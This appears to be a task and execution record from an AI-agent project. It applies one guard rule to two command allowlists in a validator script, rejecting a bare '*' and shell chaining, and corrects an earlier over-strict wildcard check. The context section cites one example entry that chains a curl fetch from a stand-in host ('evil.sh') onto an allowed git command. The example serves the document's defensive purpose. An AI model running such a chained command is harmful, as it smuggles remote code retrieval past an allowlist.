# TASK-0074 — One guard pair for both command allowlists, and a correction to TASK-0071

## Objective

Close `B-027`. Apply the two `test_allow` entry guards to `bash_allow` as well,
**and relax the wildcard guard in both** from *"is or begins with `*`"* to
*"is a bare `*`"* — correcting an over-restriction `TASK-0071` introduced three
tasks ago.

## Minimal context

`B-027` was raised by `TASK-0071` from **an asymmetry that task deliberately
created**: `test_allow` entries are gated against opening with `*` and against
carrying a shell chaining metacharacter, `bash_allow` entries against neither.
So `bash_allow: ['*']` is a legal way to write `bash: allow` — the exact
resolution `B-021` forbade for the test term — and `'git status; curl evil.sh'`
is a legal single entry.

**Human decision, 2026-09-23: one guard pair, both keys, and fix the
over-shoot in the same change.**

**The over-shoot, stated plainly because it is my own.** `TASK-0071`'s guard
rejects any entry *beginning* with `*`. Its stated purpose is that *"an
allowlist that opens universal is not an allowlist"* — but only a **bare** `*`
makes an allowlist universal. `*pytest*` matches commands containing `pytest`
and nothing else; it is narrow, legitimate, and currently rejected. The guard
enforced more than its own justification supported, which is the kind of rule
that gets deleted by a later author who hits it on a legitimate case rather
than argued with.

**The counter-argument recorded in `B-027` does not survive contact.** It said
a blanket `*` *"may be a legitimate thing for an author to write deliberately"*
in the general-purpose term. It is not: a role wanting unrestricted bash simply
**omits `bash-allowlist`**. An allowlist that allows everything is a
contradiction in terms, and `"*": "deny"` followed by `"*": "allow"` under
last-match-wins is precisely `bash: allow` with extra steps. Retracted here
rather than left in the table to mislead.

## Inputs

| Artifact | Produced by | Expected state |
|----------|-------------|----------------|
| `tests/validate.sh` | `TASK-0071` | `TEST_CHAINERS`; the `test_allow` block with the `pattern.startswith("*")` check; the `bash_allow` block with no entry checks |
| `docs/development/authoring-guide.md` | `TASK-0071` | `test_allow` schema row; *"`test-allowlist` is constrained where `bash-allowlist` is not"* section |
| `agents/git-ops/agent.md` | `TASK-0045` | `bash_allow: ['git *']` |
| `agents/review/agent.md` | `TASK-0045` | `bash_allow`: four `git` globs |
| `agents/qa-test/agent.md` | `TASK-0071` | `bash_allow` (3) + `test_allow` (10) |

**Verify the expected state; don't assume it.** `TASK-0071` asserted the role
pair as *"git-ops and shell-runner"* and was wrong — `shell-runner` has never
existed. Re-read which roles actually carry `bash_allow` before claiming any
of them pass.

## Scope

### Included

- `tests/validate.sh`: one shared entry-guard applied to **both** `bash_allow`
  and `test_allow`; wildcard check narrowed to a bare `*`.
- `docs/development/authoring-guide.md`: the section retitled and rewritten so
  the rule is stated **once** for both keys, with the over-shoot correction
  visible rather than silently applied.
- Fixtures proving, for **each** key: bare `*` rejected, chaining rejected,
  and **`*pytest*` accepted** — the case that was wrongly rejected before.
- `B-027` closed, and its counter-argument explicitly retracted.

### Not included

- Changing any role's `bash_allow` or `test_allow` contents. The guards are
  expected to pass on all three roles unchanged; if one fails, that is a
  finding to report, not a licence to edit the role here.
- A third guard of any kind. Two were decided; inventing a third is the
  `ADR-0008` failure.
- Anything about `B-028` — that is `TASK-0075`.

## Likely files

- `tests/validate.sh`, `docs/development/authoring-guide.md`
- `.ai/planning/BACKLOG.md`, `.ai/tasks/TODO.md`, `.ai/context/CURRENT_STATE.md`
- **Not** any `agents/*/agent.md`, and **not** `docs/registry.md`.

## Execution plan

1. Re-read which roles carry `bash_allow`, and their entries.
2. Rewrite the gate: one guard function, both keys, bare-`*` wildcard rule.
3. Prove each rejection **and** the newly-accepted `*pytest*` case, per key.
4. Confirm all three real roles still pass.
5. Guide: one rule for both keys, correction noted.
6. `tests/validate.sh`, `sync-registry.sh`, remove fixtures, diff, commit, push.

## Acceptance criteria

- [ ] `bash_allow` and `test_allow` are guarded identically, by one rule.
- [ ] A **bare `*`** is rejected in both keys — observed.
- [ ] A **chaining metacharacter** is rejected in both keys — observed.
- [ ] **`*pytest*` is accepted** in both keys — observed. This is the
      regression test for the over-shoot.
- [ ] `git-ops`, `review` and `qa-test` pass unchanged.
- [ ] The guide states the rule once and shows the correction.
- [ ] Fixtures removed, removal verified.

## Mandatory validations

- [ ] `tests/validate.sh`
- [ ] `scripts/sync-registry.sh` (expect no diff)
- [ ] `git status --porcelain`

## Risks and rollback

- **Relaxing a guard is a widening.** The bare-`*` rule must still reject the
  case `B-021` forbade; the fixture proving that is mandatory, not optional.
- **Breaking a live role's boundary.** Mitigated by running the gate against
  all three real roles and by changing no role file.
- Rollback is `git revert` of one commit.

## Outputs / handover

*Forecast until verified.*

| Artifact | End state |
|----------|-----------|
| `tests/validate.sh` | One entry guard, both keys, bare-`*` rule, each case observed |
| `docs/development/authoring-guide.md` | Rule stated once; `TASK-0071`'s over-shoot corrected visibly |
| `agents/*/agent.md` | **All unchanged**, deliberately |

**Next task starts here**: `B-028` (`TASK-0075`), independent of this one.

## Status
- Status: done
- Owner: agent
- Created: 2026-09-23
- Updated: 2026-09-23

## Execution log
### Attempt 1
- Date: 2026-09-23
- Agent: Claude Opus 5 (1M context)
- Actions:
  1. Re-read which roles carry `bash_allow` rather than trusting this row's
     own history: **`git-ops`, `review`, `qa-test`** — not `shell-runner`,
     which `TASK-0071` named and which has never existed.
  2. Replaced the two separate blocks with **one `check_command_allowlist()`**
     covering both keys: both directions of the iff, non-emptiness, and the
     two entry guards. The two keys can no longer drift apart.
  3. Narrowed the wildcard rule from *"is or begins with `*`"* to *"is a bare
     `*`"*, in both keys.
  4. Guide: the section retitled *"Both command allowlists are constrained, by
     one rule"*, the rule stated once, and the correction recorded in a block
     quote rather than applied silently.
- Observations:
  - **Eight cases observed, four per key**: bare `*` **rejected**; chaining
    **rejected**; `*pytest*` **accepted**; an ordinary prefix glob accepted.
    The third is the regression test for the over-shoot — it **failed** under
    `TASK-0071`'s rule and passes now.
  - **The iff-logic survived the refactor**, spot-checked after moving it into
    a function: term-without-key, empty-key and key-without-term each still
    produce their own distinct message for `bash_allow`.
  - **All three real roles pass unchanged**, and **no role file was edited** —
    the outcome the brief predicted, so the relaxation did not have to be paid
    for anywhere.
  - **The over-shoot is mine and is recorded as mine.** `TASK-0071` wrote a
    guard stricter than the justification it gave for it. That is a smaller
    defect than the one it fixed, but it is the same class: a rule whose
    stated reason does not match what it does.
- Validation:
  - `tests/validate.sh` — **OK**
  - `scripts/sync-registry.sh` — no diff
  - `git status --porcelain` — fixtures removed; `agents/` untouched
- Result: **done.** `B-027` closed, its counter-argument retracted, and a
  `TASK-0071` over-restriction corrected in the same change.
- Commit: *pending — recorded in the follow-up commit*
- Push: *pending*
